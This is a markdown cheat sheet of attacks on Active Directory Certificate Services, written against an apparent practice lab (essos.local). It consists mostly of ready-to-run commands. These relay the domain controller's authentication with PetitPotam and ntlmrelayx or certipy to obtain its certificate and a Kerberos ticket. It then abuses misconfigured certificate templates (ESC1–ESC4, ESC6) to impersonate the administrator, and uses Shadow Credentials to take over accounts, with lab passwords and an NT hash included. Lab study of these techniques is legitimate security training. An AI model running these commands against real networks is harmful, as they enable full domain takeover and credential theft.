# ADCS

- Target running ADCS: `10.10.10.23 (braavos.essos.local)`
- DC: `10.10.10.12 (meereen.essos.local)`
- Attacker listening on: `10.10.10.200`

## Tools

- [PKINIT Tools](https://github.com/dirkjanm/PKINITtools)
    ```sh
    git clone https://github.com/dirkjanm/PKINITtools
    virtualenv -p python3 venv

    # choose either one
    pip install https://github.com/wbond/oscrypto/archive/d5f3437ed24257895ae1edd9e503cfb352e635a8.zip
    pip install 'oscrypto @ git+https://github.com/wbond/oscrypto.git'

    pip install minikerberos impacket
    ```

- [petitpotam](https://github.com/topotam/PetitPotam)
- [certipy](https://github.com/ly4k/Certipy)

## ntlmrelayx + petitpotam

```sh
# To obtain the DC computer account certificate in base64 format when petitpotam is run
ntlmrelayx -t http://10.10.10.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Trigger
petitpotam.py 10.10.10.200 meereen.essos.local

# Obtain TGT
gettgtpkinit.py -dc-ip 10.10.10.12 -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'
```

If `gettgtpkinit` returns this error, most probably time issue between DCs

```console
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_CLIENT_NOT_TRUSTED Detail: "The client trust failed or is not implemented"
```

## certipy + petitpotam

```sh
# Certipy v4.8.2
# To obtain the DC computer account certificate in .pfx when petitpotam is run
certipy relay -target http://10.10.10.23/certsrv/certfnsh.asp -template DomainController
# or
certipy relay -ca ESSOS-CA -target http://10.10.10.23/certsrv/certfnsh.asp -template DomainController

petitpotam.py 10.10.10.200 meereen.essos.local

# Obtain TGT
certipy auth -pfx ./meereen.pfx -dc-ip 10.10.10.12
# or
certipy auth -pfx <(base64 -d cert.b64) -dc-ip 10.10.10.12
```

## certipy enumeration

```sh
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 10.10.10.12
```

## certipy exploitation

### ESC1

```sh
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.12
```

### ESC2

```sh
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC2 -ca ESSOS-CA
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.12
```

### ESC3

```sh
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC3-CRA -ca ESSOS-CA
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC3 -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.12
# or
certipy auth -pfx administrator.pfx -username administrator -domain essos.local -dc-ip 10.10.10.12
```

### ESC4

Modifies `ESC4` to be `ESC1` with `genericWrite` privilege

```sh
certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old

# same as ESC1
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local

certipy auth -pfx administrator.pfx -dc-ip 10.10.10.12

certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
```

### ESC6

> Because ESSOS-CA is vulnerable to ESC6 we can do the ESC1 attack but with the user template instead of the ESC1 template even if the user template got Enrollee Supplies Subject set to false.

```sh
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.local

certipy auth -pfx administrator.pfx -dc-ip 10.10.10.12
```

### Shadow Credentials

- requires `GenericWrite` on another user.
- requires ADCS enabled on domain
- requires write privilege on `msDS-KeyCredentialLink`

```sh
# khal.drogo ---[GenericAll]---> viserys.targaryen ---[GenericWrite]---> jorah.mormont
certipy shadow auto -u khal.drogo@essos.local -p 'horse' -account 'viserys.targaryen'
certipy shadow auto -u viserys.targaryen@essos.local -hashes 'd96a55df6bef5e0b4d6d956088036097' -account 'jorah.mormont'
```

## Further Reading

- [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [RBDC](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)

